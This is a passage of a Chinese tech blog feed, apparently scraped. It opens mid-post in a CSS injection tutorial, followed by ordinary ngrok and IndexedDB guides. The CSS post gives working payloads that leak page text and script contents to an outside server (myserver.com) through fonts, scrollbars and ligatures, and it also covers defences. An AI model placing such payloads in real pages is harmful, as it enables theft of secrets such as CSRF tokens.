除了偷屬性之外，有沒有辦法偷到其他東西？例如說，頁面上的其他文字？或甚至是 script 裡面的程式碼？\n根據我們在上一篇裡面講的原理，是做不到的。因為能偷到屬性是因為「屬性選擇器」這個東西，才讓我們選到特定的元素，而在 CSS 裡面，並沒有可以選擇「內文」的選擇器。\n因此，我們需要對 CSS 以及網頁上的樣式有更深入的理解，才有辦法達成這件看似不可能的任務。\nunicode-range 在 CSS 裡面，有一個屬性叫做「unicode-range」，可以針對不同的字元，載入不同的字體。像是底下這個從 MDN 拿來的範例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;Ampersand\u0026#34;; src: local(\u0026#34;Times New Roman\u0026#34;); unicode-range: U+26; } div { font-size: 4em; font-family: Ampersand, Helvetica, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;Me \u0026amp; You = Us\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026amp; 的 unicode 是 U+0026，因此只有 \u0026amp; 這個字會用不同的字體來顯示，其他都用同一個字體。\n這招前端工程師可能有用過，例如說英文跟中文如果要用不同字體來顯示，就很適合用這一招。而這招也可以用來偷取頁面上的文字，像這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;f1\u0026#34;; src: url(https://myserver.com?q=1); unicode-range: U+31; } @font-face { font-family: \u0026#34;f2\u0026#34;; src: url(https://myserver.com?q=2); unicode-range: U+32; } @font-face { font-family: \u0026#34;f3\u0026#34;; src: url(https://myserver.com?q=3); unicode-range: U+33; } @font-face { font-family: \u0026#34;fa\u0026#34;; src: url(https://myserver.com?q=a); unicode-range: U+61; } @font-face { font-family: \u0026#34;fb\u0026#34;; src: url(https://myserver.com?q=b); unicode-range: U+62; } @font-face { font-family: \u0026#34;fc\u0026#34;; src: url(https://myserver.com?q=c); unicode-range: U+63; } div { font-size: 4em; font-family: f1, f2, f3, fa, fb, fc; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;ca31a\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 如果你去看 network tab，會看到一共發送了 4 個 request：\n藉由這招，我們可以得知頁面上有：13ac 這四個字元。\n而這招的侷限之處也很明顯，就是：\n我們不知道字元的順序為何 重複的字元也不會知道 但是從「載入字型」的角度下去思考怎麼偷到字元，著實帶給了許多人一個新的思考方式，並發展出各式各樣其他的方法。\n字體高度差異 + first-line + scrollbar 這招要解決的主要是上一招碰到的問題：「沒辦法知道字元順序」，然後這招結合了很多細節，步驟很多，要仔細聽了。\n首先，我們其實可以不載入外部字體，用內建的字體就能 leak 出字元。這要怎麼做到呢？我們要先找出兩組內建字體，高度會不同。\n例如有一個叫做「Comic Sans MS」的字體，高度就比另一個「Courier New」高。\n舉個例子，假設預設字體的高度是 30px，而 Comic Sans MS 是 45px 好了。那現在我們把文字區塊的高度設成 40px，並且載入字體，像這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 30px; height: 40px; width: 100px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;DBC\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;ABC\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 就會在畫面上看到差異：\n很明顯 A 比其他字元的高度都高，而且根據我們的 CSS 設定，如果內容高度超過容器高度，會出現 scrollbar。雖然上面是截圖看不出來，但是下面的 ABC 有出現 scrollbar，而上面的 DBC 沒有。\n再者，我們其實可以幫 scrollbar 設定一個外部的背景：\n1 2 3 4 5 6 7 div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: url(https://myserver.com?q=a); } 也就是說，如果 scrollbar 有出現，我們的 server 就會收到 request。如果 scrollbar 沒出現，就不會收到 request。\n更進一步來說，當我把 div 套用 “fa” 字體時，如果畫面上有 A，就會出現 scrollbar，server 就會收到 request。如果畫面上沒有 A，就什麼事情都不會發生。\n因此，我如果一直重複載入不同字體，那我在 server 就能知道畫面上有什麼字元，這點跟剛剛我們用 unicode-range 能做到的事情是一樣的。\n那要怎麼解決順序的問題呢？\n我們可以先把 div 的寬度縮減到只能顯示一個字元，這樣其他字元就會被放到第二行去，再搭配 ::first-line 這個 selector，就可以特別針對第一行做樣式的調整，像是這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 0px; height: 40px; width: 20px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } div::first-line{ font-size: 30px; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;CBAD\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 畫面上你就只會看到一個「C」的字元，因為我們先用 font-size: 0px 把所有字元的尺寸都設為 0，再用 div::first-line 去做調整，讓第一行的 font-size 變成 30px。換句話說，只有第一行的字元能看到，而現在的 div 寬度只有 20px，所以只會出現第一個字元。\n接著，我們再運用剛剛學會的那招，去載入看看不同的字體。當我載入 fa 這個字體時，因為畫面上沒有出現 A，所以不會有任何變化。但是當我載入 fc 這個字體時，畫面上有 C，所以就會用 Comic Sans MS 來顯示 C，高度就會變高，scrollbar 就會出現，就可以利用它來發出 request，像這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 div { font-size: 0px; height: 40px; width: 20px; font-family: fc, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; --leak: url(http://myserver.com?C); } div::first-line{ font-size: 30px; } div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: var(--leak); } 那我們要怎麼樣不斷使用新的 font-family 呢？用 CSS animation 就可以做到，你可以用 CSS animation 不斷載入不同的 font-family 以及指定不同的 –leak 變數。\n如此一來，我們就能知道畫面上的第一個字元到底是什麼。\n知道了第一個字元以後，我們把 div 的寬度變長，例如說變成 40px，就能容納兩個字元，因此第一行就會是前兩個字，接著再用一樣的方式載入不同的 font-family，就能 leak 出第二個字元，詳細流程如下：\n假設畫面上是 ACB 調整寬度為 20px，第一行只出現第一個字元 A 載入字體 fa，因此 A 用較高的字體顯示，出現 scrollbar，載入 scrollbar 背景，傳送 request 給 server 載入字體 fb，但是 B 沒有出現在畫面上，因此沒有任何變化。 載入字體 fc，但是 C 沒有出現在畫面上，因此沒有任何變化。 調整寬度為 40px，第一行出現兩個字元 AC 載入字體 fa，因此 A 用較高的字體顯示，出現 scrollbar，此時應該是因為這個背景已經載入過，所以不會發送新的 request 載入字體 fb，沒出現在畫面上，沒任何變化 載入字體 fc，C 用較高的字體顯示，出現 scrollbar 並且載入背景 調整寬度為 60px，ACB 三個字元都出現在第一行 載入字體 fa，同第七步 載入字體 fb，B 用較高的字體顯示，出現 scrollbar 並且載入背景 載入字體 fc，C 用較高的字體顯示，但因為已經載入過相同背景，不會發送 request 結束 從上面流程中可以看出 server 會依序收到 A, C, B 三個 reqeust，代表了畫面上字元的順序。而不斷改變寬度以及 font-family 都可以用 CSS animation 做到。\n想要看完整 demo 的可以看這個網頁（出處：What can we do with single CSS injection?）：https://demo.vwzq.net/css2.html\n這個解法雖然解決了「不知道字元順序」的問題，但依然無法解決重複字元的問題，因為重複的字元不會再發出 request。\n大絕招：ligature + scrollbar 先講結論，這一招可以解決上面所有問題，達成「知道字元順序，也知道重複字元」的目標，能夠偷到完整的文字。\n要理解怎麼偷之前，我們要先知道一個專有名詞，叫做連字（ligature），在某些字型當中，會把一些特定的組合 render 成連在一起的樣子，如下圖（來源：wikipedia）：\n那這個對我們有什麼幫助呢？\n我們可以自己製作出一個獨特的字體，把 ab 設定成連字，並且 render 出一個超寬的元素。接著，我們把某個 div 寬度設成固定，然後結合剛剛 scrollbar 那招，也就是：「如果 ab 有出現，就會變很寬，scrollbar 就會出現，就可以載入 request 告訴 server；如果沒出現，那 scrollbar 就不會出現，沒有任何事情發生」。\n流程是這樣的，假設畫面上有 acc 這三個字：\n載入有連字 aa 的字體，沒事發生 載入有連字 ab 的字體，沒事發生 載入有連字 ac 的字體，成功 render 超寬的畫面，scrollbar 出現，載入 server 圖片 server 知道畫面上有 ac 載入有連字 aca 的字體，沒事發生 載入有連字 acb 的字體，沒事發生 載入有連字 acc 的字體，成功 render，scrollbar 出現，傳送結果給 server server 知道畫面上有 aca 透過連字結合 scrollbar，我們可以一個字元一個字元，慢慢 leak 出畫面上所有的字，甚至連 JavaScript 的程式碼都可以！\n你知道，script 的內容是可以顯示在畫面上的嗎？\n1 2 3 head, script { display: block; } 只要加上這個 CSS，就可以讓 script 內容也顯示在畫面上，因此我們也可以利用同樣的技巧，偷到 script 的內容！\n在實戰上的話，你可以用 SVG 搭配其他工具，在 server 端迅速產生字體，想要看細節以及相關程式碼的話，可以參考這篇：Stealing Data in Great style – How to Use CSS to Attack Web Application.\n而這邊我就簡單做個簡化到不行的 demo，來證明這件事情是可行的。為了簡化，有人做了一個 Safari 版本的 demo，因為 Safari 支援 SVG font，所以不需要再從 server 產生字型，原始文章在這裡：Data Exfiltration via CSS + SVG Font - PoC (Safari only)\n簡易版 demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var secret = \u0026#34;abc123\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;script\u0026gt; var secret2 = \u0026#34;cba321\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;font horiz-adv-x=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;font-face font-family=\u0026#34;hack\u0026#34; units-per-em=\u0026#34;1000\u0026#34; /\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026#34;a\u0026#39; horiz-adv-x=\u0026#34;99999\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;/font\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;style\u0026gt; script { display: block; font-family:\u0026#34;hack\u0026#34;; white-space:n owrap; overflow-x: auto; width: 500px; background:lightblue; } script::-webkit-scrollbar { background: blue; } \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 我用 script 放了兩段 JS，裡面內容分別是 var secret = \u0026quot;abc123\u0026quot; 跟 var secret2 = \u0026quot;cba321\u0026quot;，接著利用 CSS 載入我準備好的字體，只要有 \u0026quot;a 的連字，就會寬度超寬。\n再來如果 scrollbar 有出現，我把背景設成藍色的，比較顯眼，最後的結果如下：\n上面因為內容是 var secret = \u0026quot;abc123\u0026quot;，所以符合了 \u0026ldquo;a 的連字，因此寬度變寬，scrollbar 出現。\n下面因為沒有 \u0026quot;a，所以 scrollbar 沒出現（有 a 的地方都會缺字，應該跟我沒有定義其他的 glyph 有關，但不影響結果）\n只要把 scrollbar 的背景換成 URL，就可以從 server 端知道 leak 的結果。\n如果想看實際的 demo 跟 server 端的寫法，可以參考上面附的那兩篇文章。\n防禦方式 最後我們來講一下防禦方式，最簡單明瞭的當然就是直接把 style 封起來不給用，基本上就不會有 CSS injection 的問題（除非實作方式有漏洞）。\n如果真的要開放 style，也可以用 CSP 來阻擋一些資源的載入，例如說 font-src 就沒有必要全開，style-src 也可以設置 allow list，就能夠擋住 @import 這個語法。\n再來，也可以考慮到「如果頁面上的東西被拿走，會發生什麼事情」，例如說 CSRF token 被拿走，最壞就是 CSRF，此時就可以實作更多的防護去阻擋 CSRF，就算攻擊者取得了 CSRF token，也沒辦法 CSRF（例如說多檢查 origin header 之類的）。\n總結 CSS 果真博大精深，真的很佩服這些前輩們可以把 CSS 玩出這麼多花樣，發展出這麼多令人眼界大開的攻擊手法。當初在研究的時候，利用屬性選擇器去 leak 這個我可以理解，用 unicode-range 我也能理解，但是那個用文字高度加上 CSS animation 去變化的，我花了不少時間才搞懂那在幹嘛，連字那個雖然概念好懂，但真的要實作還是會碰到不少問題。\n最後，這兩篇文章主要算是介紹一下 CSS injection 這個攻擊手法，因此實際的程式碼並不多，而這些攻擊手法都參考自前人們的文章，列表我會附在下面，有興趣的話可以閱讀原文，會講得更詳細一點，如果對哪項攻擊想要深入了解，也可以留言跟我交流。\n","date":"2022-10-03T00:00:00Z","image":"https://live.staticflickr.com/65535/52401028978_fc63caee61_o.jpg","permalink":"https://wayneblog.ga/2022-10-03/css-injection/","title":"用 CSS 來偷資料 - CSS injection"},{"content":" 參考文章 Alan Tsai 的學習筆記 Ngrok：讓本機測試時也能有 HTTPS 憑證 前言 在開發的過程中，有時候會需要從另外一臺機器測試在local的網站及服務。最常見的情況就是當要測試網站在手機上看起來長什麽樣子的時候，或者有時候要讓別人連到自己local的sql serer的時候。 ngrok 就是讓這一切變得容易的工具，而且很佛心的是，免費版就夠一般使用。 運作模式 ngrok 就是一個 reverse proxy 的工具，透過把 local 的 port map 到一個 public 的地址，讓外部能夠透過這個 public 地址連到，然後工具用 reverse proxy 和 local 實際的 port 取得資料。 因此有個缺點，就是速度相對較慢，尤其是 ngrok 的伺服器在美國因此也會減少一些速度。不過如果是爲了開發測試用，這個就不算缺點。 ngrok 免費版本提供了一個動態的地址，需要進階功能或者同時map多個服務就需要付費。 安裝與使用 需先安裝 unzip (解壓縮用) 1 yum install zip unzip 步驟 1 - 到官網下載相對應系統的 ngrok 安裝包 1 2 ### 以 linux 64 為例 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip 步驟 2 - 解壓縮安裝包並搬移到 /usr/bin/ 中 1 unzip ngrok-stable-linux-amd64.zip 1 mv ngrok /usr/bin/. 步驟 3 - 到 ngrok 官網註冊一個免費帳號 步驟 4 - 將 dashboard 上顯示的 token 設定至本機 1 ngrok authtoken XXXXXXXXXXXXXXXX 顯示此畫面代表已設定完成。 步驟 5 - 假設服務跑在本機的 port 3000，則執行以下指令 1 ngrok http 3000 顯示此畫面代表已成功跑起服務，打開網址即可。 直到 ngrok 關掉或 ngrok session 過期之前，這兩個 URL 都可以被公開存取。 進階使用 外連的 web 服務加密 有時候給別人測試的鏈接不希望任意的人都能夠開啓，ngrok非常貼心的提供了這個服務。 只需要在 mapping 的時候加上 auth 這個參數就可以設定密碼保護。例如： 1 ngrok http --auth=admin:12345 3000 意思是，賬號要是admin，而密碼是12345 map 到 3000 port。 重寫 hostname 有些服務會使用到 hostname 的值，這個時候重寫 hostname 的功能就變得很重要。可以使用 host-header 做設定。 這邊的例子用的是在 IIS 裏面設定只有 test.com 才會 binding 到 80 port，使用的指令就是： 1 ngrok http --host-header=test.com 80 ","date":"2022-09-26T00:00:00Z","image":"https://live.staticflickr.com/65535/52384429631_a48959b2b8_o.png","permalink":"https://wayneblog.ga/2022-09-26/ngrok-basic/","title":"透過 ngrok 產生臨時用的網址到指定機器"},{"content":" 參考網站1\n參考網站2\nIndexedDB 介紹 key-value 的儲存形式，透過索引功能來高效率搜尋資料。 同源政策 same-origin policy：只能取用同網域下的資料。 Async API : 提供非同步 api，單線程的應用下取用資料時就不會有 block the main thread 的情況造成使用者體驗不佳。 transaction : 能夠確保大量寫入資料時的完整性，如果有單筆資料寫入失敗會全數 rollback。 相容性 大部分的瀏覽器都已經支援使用，參閱：When Can I Use IndexedDB 儲存限制 單一資料庫項目的容量/大小並沒有任何限制，但是各個 IndexedDB資料庫的容量就有限制，且根據各瀏覽器其限制會不同。\nChrome：允許瀏覽器使用多達總磁盤空間的60％。 您可以使用StorageManager API來確定可用的最大配額。 其他基於Chromium的瀏覽器可能允許該瀏覽器使用更多存儲空間。 Internet Explorer 10 和更高版本：最多可以存儲250MB，並且在使用了10MB以上時將提示用戶。 Firefox：允許一個來源最多使用2GB。 您可以使用StorageManager API來確定仍有多少可用空間。 Safari (both desktop and mobile) 似乎最多可容納1GB，達到限制後，Safari會提示用戶，以200MB為增量增加限制。 refer to storage-for-the-web\n資料鍵(Key) data type: string, date, float和 array 必須是能排序的值(無法處理多國語言字串排序) 物件存檔有三種方式產生資料鍵: 資料鍵產生器 (key generator)、資料鍵路徑 (key path) 以及指定值。 資料鍵產生器 (key generator)：用產生器自動產生資料鍵。 資料鍵路徑 (key path)：空字串或是javascript identifier（包含用 \u0026ldquo;.\u0026rdquo; 分隔符號的名稱）且路徑不能有空白 (實測過中文會被轉成空字串)。 基本操作步驟 操作IndexedDB的基本步驟建議如下： 開啟資料庫和交易(transaction) 建立物件存檔(object store) 發出資料庫操作請求，例如新增或取得資料 聆聽對應DOM事件等待操作完成 從result物件上取得結果進行其他工作 使用方式 1. 試驗瀏覽器的前綴標示 如果需要試驗瀏覽器的前綴標示，可以如下： 1 2 3 4 5 6 7 // In the following line, you should include the prefixes of implementations you want to test. window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB; // DON\u0026#39;T use \u0026#34;var indexedDB = ...\u0026#34; if you\u0026#39;re not in a function. // Moreover, you may need references to some window.IDB* objects: window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction; window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange; // (Mozilla has never prefixed these objects, so we don\u0026#39;t need window.mozIDB*) 請注意瀏覽器前綴標示的實作可能不完整、有些問題或仍然遵守舊版標準，因此不建議在正式版程式碼中使用。與其宣稱支援又有問題，倒不如直接不支援。 1 2 3 if (!window.indexedDB) { window.alert(\u0026#34;Your browser doesn\u0026#39;t support a stable version of IndexedDB. Such and such feature will not be available.\u0026#34;); } 2. 開啟資料庫 1 2 3 4 5 6 7 8 9 // Let us open database let request = window.indexedDB.open(\u0026#34;DB名稱\u0026#34;, 3); request.onerror = function(event) { // Do something with request.errorCode! }; request.onsuccess = function(event) { // Do something with request.result! }; 開啟請求並不會立刻開啟資料庫或交易，呼叫open()方法會回傳一個IDBOpenDBRequest物件，這個物件擁有兩個事件(success 和 error)。大部分IndexedDB的非同步功能都會回傳一個IDBDatabase類物件，然後我們可以註冊成功和失敗事件處理器。 .open()方法第二個參數是資料庫版本，資料庫版本決定了資料庫結構，也就是資料庫物件存檔的結構。如果請求版本不存在(比如因為這是一個新資料庫或是資料庫版本已升級)，onupgradeneeded事件會被觸發，然後我們可以在onupgradeneeded事件處理器中再建立新的版本，下面升級資料庫版本有更詳細的說明。 3. 使用資料鍵產生器 當建立物件存檔時設定autoIncrement旗標為ture將啟動資料鍵產生器，預設上該旗標為false。 有了資料鍵產生器，當新增資料到物件存檔中，資料鍵產生器會自動幫我們產生資料鍵。資料鍵產生器產生的資料鍵由整數1開始，而基本上新產生的資料鍵是由前一個資料鍵加1產生。資料鍵的產生不會因為資料刪除或清空所有資料而重新開始起算，所以資料鍵值是一直累加上去的，除非資料庫操作中斷，整個交易作業被取消。 我們可以建立一個有資料鍵產生器的物件存檔如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // Open the indexedDB. var request = indexedDB.open(dbName, 3); request.onupgradeneeded = function (event) { var db = event.target.result; // Create another object store called \u0026#34;names\u0026#34; with the autoIncrement flag set as true. var objStore = db.createObjectStore(\u0026#34;names\u0026#34;, { autoIncrement : true }); // Because the \u0026#34;names\u0026#34; object store has the key generator, the key for the name value is generated automatically. // The added records would be like: // key : 1 =\u0026gt; value : \u0026#34;Bill\u0026#34; // key : 2 =\u0026gt; value : \u0026#34;Donna\u0026#34; for (var i in customerData) { objStore.add(customerData[i].name); } } 關於資料鍵產生器細節，請參考\u0026ldquo;W3C Key Generators\u0026rdquo;。\n4. 新增和刪除資料 在操作資料庫之前必須要先進行交易，交易來自資料庫物件，在交易中要指定涵蓋物件存檔範圍，然後也要決定是要變更資料庫或純粹讀取資料。 交易共有三種種類，分別是讀取(read-only)，讀寫(read/write), 以及版本變更(versionchange)，如果只需要讀資料最好只使用讀取(read-only)交易，因為讀取(read-only)交易可以多重同步進行。 創建資料庫後，如果要寫入資料請這麼做： 1 2 3 4 var transaction = db.transaction([\u0026#34;customers\u0026#34;], \u0026#34;readwrite\u0026#34;); // Note: Older experimental implementations use the deprecated constant IDBTransaction.READ_WRITE instead of \u0026#34;readwrite\u0026#34;. // In case you want to support such an implementation, you can just write: // var transaction = db.transaction([\u0026#34;customers\u0026#34;], IDBTransaction.READ_WRITE); 呼叫 transaction() 方法會回傳一個交易物件。transaction()第一個接受參數代表交易涵蓋的物件存檔，雖然傳入空陣列會讓交易涵蓋所有物件存檔，但請不要這麼做，因為根據正式標準傳入空陣列應該要導致InvalidAccessError錯誤；第二個參數代表交易種類，不傳入的話預設為讀取交易，本例要寫入資料庫所以傳入讀寫(\u0026ldquo;readwrite\u0026rdquo;)。 交易的生命週期和事件循環關係密切。當我們發起交易又回到事件循環中後，如果忽略，那麼交易將轉成結束，唯一保持交易存活的方法是在交易上發出請求；當請求完成後我們會收到DOM事件，假設請求結果成功，我們可以在事件的回呼函數(callback中)繼續進行交易，反之，如果我們沒有繼續進行交易，那麼交易將結束，也就是說只要尚有未完成請求的話，交易就會繼續存活，如果收到TRANSACTION_INACTIVE_ERR錯誤那便意謂著交易早已結束，我們錯過了繼續進行交易的機會。 交易能收到三種事件: 錯誤(error)、中斷(abort)以及完成(complete)，其中錯誤事件會向上傳遞，所以任何一個交易下轄的請求產生錯誤事件，該交易都會收到。如果交易收到錯誤事件時，瀏覽器預設行為會中斷交易，除非我們有在錯誤事件上呼叫preventDefault()阻擋瀏覽器預設行動，否則整筆交易都將取消、復原，這樣的設計告訴我們必須要思考如何處裡錯誤，或者說如果對每一個錯誤進行處裡過於麻煩，那麼至少加入一個概括性的錯誤處理器也是可以。只要不處裡錯誤或呼叫abort()，交易將取消、復原，然後中斷事件接著觸發，反之，當所有請求都完成後，我們會收到一個完成事件，所以說如果我們同時發起多項請求時，可以只追蹤單一交易而非個別請求，這樣會大大減輕我們的負擔。 有了交易之後便能夠從中取得物件存檔，有了物件存檔便能夠新增資料(請注意唯有在建立交易時指定的物件存檔能夠取得)。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // Do something when all the data is added to the database. transaction.oncomplete = function(event) { alert(\u0026#34;All done!\u0026#34;); }; transaction.onerror = function(event) { // Don\u0026#39;t forget to handle errors! }; var objectStore = transaction.objectStore(\u0026#34;customers\u0026#34;); for (var i in customerData) { var request = objectStore.add(customerData[i]); request.onsuccess = function(event) { // event.target.result == customerData[i].ssn; }; } 呼叫 add() 方法可以加入一筆新資料，呼叫後會回傳一個IDBRequest物件，即為上方範例中的request，如果新增成功，request的成功事件會被觸發，而成功事件物件中有一個result屬性，這個result值剛好就等於新資料的資料鍵，所以說上方範例中的event.target.result剛好就等於顧客的ssn值(因為我們用ssn屬性作為資料鍵路徑)。請注意add方法只在當物件存檔中沒有相同資料鍵資料存在時有用，如果想要更動或是直接覆蓋現存資料請呼叫put方法。 5. 移除資料 移除資料十分容易： 1 2 3 4 var request = db.transaction([\u0026#34;customers\u0026#34;], \u0026#34;readwrite\u0026#34;).objectStore(\u0026#34;customers\u0026#34;).delete(\u0026#34;444-44-4444\u0026#34;); request.onsuccess = function(event) { // It\u0026#39;s gone! }; 6. 讀取資料 要取資料庫內的資料有數種途徑，第一個最簡單的途徑就是提供資料鍵，呼叫 get() 方法取得資料： 1 2 3 4 5 6 7 8 9 10 var transaction = db.transaction([\u0026#34;customers\u0026#34;]); var objectStore = transaction.objectStore(\u0026#34;customers\u0026#34;); var request = objectStore.get(\u0026#34;444-44-4444\u0026#34;); request.onerror = function(event) { // Handle errors! }; request.onsuccess = function(event) { // Do something with the request.result! alert(\u0026#34;Name for SSN 444-44-4444 is \u0026#34; + request.result.name); }; 假設我們把錯誤處理放在資料庫層級，我們可以再縮短上面的程式碼如下： 1 2 3 db.transaction(\u0026#34;customers\u0026#34;).objectStore(\u0026#34;customers\u0026#34;).get(\u0026#34;444-44-4444\u0026#34;).onsuccess = function(event) { alert(\u0026#34;Name for SSN 444-44-4444 is \u0026#34; + event.target.result.name); }; 呼叫 transcation 方法而不指定模式會開啟讀取(readonly)模式，接著取得我們的目標物件存檔，輸入目標資料的資料鍵，呼叫get方法取得請求物件，然後在請求物件上註冊成功事件處理器，當作業成功後，成功事件會觸發，成功事件的物件中含有請求物件(event.target如上述範例)，請求物件中含有請求結果(event.target.result如上述範例)。 7. 使用指標(Cursor) 使用get方法需要知道資料鍵，如果想要一一存取物件存檔中的資料，我們可以利用指標： 1 2 3 4 5 6 7 8 9 10 11 var objectStore = db.transaction(\u0026#34;customers\u0026#34;).objectStore(\u0026#34;customers\u0026#34;); objectStore.openCursor().onsuccess = function(event) { var cursor = event.target.result; if (cursor) { alert(\u0026#34;Name for SSN \u0026#34; + cursor.key + \u0026#34; is \u0026#34; + cursor.value.name); cursor.continue(); } else { alert(\u0026#34;No more entries!\u0026#34;); } }; openCursor 方法第一個參數用來接受資料鍵範圍物件來限制存取資料範圍，第二個參數用來指定存取進行方向，像上面的範例程式便是以資料鍵由小到大之方向存取資料；呼叫openCursor方法後一樣會回傳一個請求物件，成功時成功事件會觸發，不過這裡有些地方要特別注意，當成功事件處裡函數被喚起時，指標物件(cursor)會存放在result屬性內(亦即上述event.target.result)，cursor物件下有兩個屬性，key屬性是資料鍵，value屬性是資料值，如果要取得下一份資料就呼叫cursor的continue()方法，然後cursor物件就會指向下一份資料，當沒有資料時，cursor會是undefined，當請求一開始便找沒有資料，result屬性也會是undefined。 以下用cursor存取一遍資料後放在陣列中的作法相當常見： 1 2 3 4 5 6 7 8 9 10 11 var customers = []; objectStore.openCursor().onsuccess = function(event) { var cursor = event.target.result; if (cursor) { customers.push(cursor.value); cursor.continue(); } else { alert(\u0026#34;Got all customers: \u0026#34; + customers); } }; Warning: 以下範例不是IndexedDB標準!\nMozilla瀏覽器自己做了一個 getAll() 方法來方便一次取得所有cursor下的資料值，這個方法相當方便，不過請小心未來它有可能會消失。以下程式碼的效果和上面的一樣： 1 2 3 objectStore.getAll().onsuccess = function(event) { alert(\u0026#34;Got all customers: \u0026#34; + event.target.result); }; 一一檢查cursor的value屬性較不利性能表現，因為物件是被動一一建立，然而呼叫 getAll()，Gecko一定要一次建立所有物件，所以如果想要一次取得所有物件的資料值陣列使用 getAll() 比較好，如果想要一一檢查每筆資料則請利用cursor的方法。 8. 使用索引 利用一定唯一的ssn碼作為資料鍵相當合乎邏輯(隱私權的問題先擱置一放，不在本文探討範圍)。不過當我們想要查詢使用者的名字的時候，如果沒有索引就需要一一檢查每一筆資料，十分沒有效率，所以我們可以建立name的索引。 1 2 3 4 var index = objectStore.index(\u0026#34;name\u0026#34;); index.get(\u0026#34;Donna\u0026#34;).onsuccess = function(event) { alert(\u0026#34;Donna\u0026#39;s SSN is \u0026#34; + event.target.result.ssn); }; 因為 name 不是唯一值，所以可能會有多筆資料符合\u0026quot;Donna\u0026quot;名字，此時呼叫 get() 會取得資料鍵最小值的資料。 9. 設定指標查詢範圍和方向 如果想要限定指標查詢範圍，那麼在乎叫 openCursor() 或 openKeyCursor() 時第一個參數要傳入 IDBKeyRange 物件以限制範圍。IDBKeyRange物件能夠只聚焦在單一資料鍵上或者一段上下限區間；上下限區間可以是封閉(含界限)或開放(不含界限)，請看以下範例： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Only match \u0026#34;Donna\u0026#34; var singleKeyRange = IDBKeyRange.only(\u0026#34;Donna\u0026#34;); // Match anything past \u0026#34;Bill\u0026#34;, including \u0026#34;Bill\u0026#34; var lowerBoundKeyRange = IDBKeyRange.lowerBound(\u0026#34;Bill\u0026#34;); // Match anything past \u0026#34;Bill\u0026#34;, but don\u0026#39;t include \u0026#34;Bill\u0026#34; var lowerBoundOpenKeyRange = IDBKeyRange.lowerBound(\u0026#34;Bill\u0026#34;, true); // Match anything up to, but not including, \u0026#34;Donna\u0026#34; var upperBoundOpenKeyRange = IDBKeyRange.upperBound(\u0026#34;Donna\u0026#34;, true); // Match anything between \u0026#34;Bill\u0026#34; and \u0026#34;Donna\u0026#34;, but not including \u0026#34;Donna\u0026#34; var boundKeyRange = IDBKeyRange.bound(\u0026#34;Bill\u0026#34;, \u0026#34;Donna\u0026#34;, false, true); 